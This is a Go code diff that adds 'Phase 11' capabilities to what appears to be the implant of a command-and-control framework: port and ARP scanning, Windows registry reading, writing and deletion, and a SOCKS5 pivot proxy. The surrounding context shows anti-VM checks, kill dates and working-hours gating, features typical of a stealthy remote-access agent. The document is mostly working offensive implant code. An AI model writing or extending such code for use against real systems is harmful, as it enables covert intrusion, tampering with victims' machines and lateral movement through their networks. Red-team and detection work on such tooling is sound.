@@ -127,6 +127,27 @@ func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
 		handleAntiVM(cmd, result)
 	case "timegate_set":
 		handleTimeGateSet(agent, cmd, result)
+	// Phase 11 — Network recon
+	case "net_scan":
+		handleNetScan(cmd, result)
+	case "arp_scan":
+		handleARPScan(cmd, result)
+	// Phase 11 — Registry
+	case "reg_read":
+		handleRegRead(cmd, result)
+	case "reg_write":
+		handleRegWrite(cmd, result)
+	case "reg_delete":
+		handleRegDelete(cmd, result)
+	case "reg_list":
+		handleRegList(cmd, result)
+	// Phase 11 — SOCKS5 pivot
+	case "socks5_start":
+		handleSOCKS5Start(cmd, result)
+	case "socks5_stop":
+		handleSOCKS5Stop(result)
+	case "socks5_status":
+		handleSOCKS5Status(result)
 	case "execute":
 		fallthrough
 	default:
@@ -915,6 +936,147 @@ func handleTimeGateSet(agent *Agent, cmd *types.Command, result *types.CommandRe
 		result.Output = fmt.Sprintf("[timegate] Set. Currently ACTIVE. Kill=%s, Hours=%02d-%02d",
 			cmd.KillDate, cmd.WorkingHoursStart, cmd.WorkingHoursEnd)
 	}
+}
+
+// ─── Phase 11: Network Recon ──────────────────────────────────────────────────
+
+func handleNetScan(cmd *types.Command, result *types.CommandResult) {
+	if len(cmd.ScanTargets) == 0 {
+		result.Error = "scan_targets required (CIDR or IP list)"
+		result.ExitCode = 1
+		return
+	}
+	timeout := time.Duration(cmd.ScanTimeout) * time.Millisecond
+	if timeout <= 0 {
+		timeout = 500 * time.Millisecond
+	}
+	results, err := RunNetScan(NetScanOpts{
+		Targets:     cmd.ScanTargets,
+		Ports:       cmd.ScanPorts,
+		Timeout:     timeout,
+		Workers:     cmd.ScanWorkers,
+		GrabBanner:  cmd.ScanGrabBanners,
+	})
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if len(results) == 0 {
+		result.Output = "(no open ports found)"
+		return
+	}
+	var sb strings.Builder
+	for _, r := range results {
+		if cmd.ScanGrabBanners && r.Banner != "" {
+			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\t%s\n", r.Host, r.Port, r.Latency.Milliseconds(), r.Banner)
+		} else {
+			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\n", r.Host, r.Port, r.Latency.Milliseconds())
+		}
+	}
+	result.Output = sb.String()
+}
+
+func handleARPScan(_ *types.Command, result *types.CommandResult) {
+	out, err := ARPScan()
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = out
+}
+
+// ─── Phase 11: Registry ───────────────────────────────────────────────────────
+
+func handleRegRead(cmd *types.Command, result *types.CommandResult) {
+	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
+		result.Error = "reg_hive, reg_key, reg_value required"
+		result.ExitCode = 1
+		return
+	}
+	val, err := RegRead(cmd.RegHive, cmd.RegKey, cmd.RegValue)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("%s\\%s\\%s = %s", cmd.RegHive, cmd.RegKey, cmd.RegValue, val)
+}
+
+func handleRegWrite(cmd *types.Command, result *types.CommandResult) {
+	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
+		result.Error = "reg_hive, reg_key, reg_value required"
+		result.ExitCode = 1
+		return
+	}
+	if err := RegWrite(cmd.RegHive, cmd.RegKey, cmd.RegValue, cmd.RegData, cmd.RegType); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] Written %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
+}
+
+func handleRegDelete(cmd *types.Command, result *types.CommandResult) {
+	if cmd.RegHive == "" || cmd.RegKey == "" {
+		result.Error = "reg_hive and reg_key required"
+		result.ExitCode = 1
+		return
+	}
+	if err := RegDelete(cmd.RegHive, cmd.RegKey, cmd.RegValue); err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if cmd.RegValue != "" {
+		result.Output = fmt.Sprintf("[+] Deleted value %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
+	} else {
+		result.Output = fmt.Sprintf("[+] Deleted key %s\\%s", cmd.RegHive, cmd.RegKey)
+	}
+}
+
+func handleRegList(cmd *types.Command, result *types.CommandResult) {
+	if cmd.RegHive == "" || cmd.RegKey == "" {
+		result.Error = "reg_hive and reg_key required"
+		result.ExitCode = 1
+		return
+	}
+	entries, err := RegList(cmd.RegHive, cmd.RegKey)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	if len(entries) == 0 {
+		result.Output = "(empty key)"
+		return
+	}
+	result.Output = strings.Join(entries, "\n")
+}
+
+// ─── Phase 11: SOCKS5 Pivot ───────────────────────────────────────────────────
+
+func handleSOCKS5Start(cmd *types.Command, result *types.CommandResult) {
+	addr := cmd.Socks5Addr
+	if addr == "" {
+		addr = "127.0.0.1:1080"
+	}
+	bound, err := StartSOCKS5(addr)
+	if err != nil {
+		result.Error = err.Error()
+		result.ExitCode = 1
+		return
+	}
+	result.Output = fmt.Sprintf("[+] SOCKS5 proxy listening on %s — configure proxychains to use it", bound)
+}
+
+func handleSOCKS5Stop(result *types.CommandResult) {
+	result.Output = "[+] " + StopSOCKS5()
+}
+
+func handleSOCKS5Status(result *types.CommandResult) {
+	result.Output = "[socks5] " + SOCKS5Status()
 }
 
 func encryptResult(agent *Agent, result *types.CommandResult) {
